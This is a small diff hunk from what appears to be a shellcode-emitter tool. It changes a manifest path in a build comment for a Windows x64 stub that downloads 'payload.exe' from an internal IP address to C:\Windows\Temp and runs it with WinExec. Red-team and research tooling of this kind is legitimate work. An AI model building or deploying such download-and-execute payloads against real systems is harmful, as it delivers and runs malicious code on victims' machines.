@@ -3,7 +3,7 @@
 # InternetReadFile -> CreateFileA -> WriteFile -> WinExec
 #
 # Build:
-#   uv run emitrion-x64 emitrion/manifests/x64/http_download_x64.yaml \
+#   uv run emitrion-x64 emitrion/manifests/win-x64/http_download_x64.yaml \
 #       --url "http://192.168.1.10/payload.exe" \
 #       --dst "C:\Windows\Temp\payload.exe" \
 #       --out emitter_out/
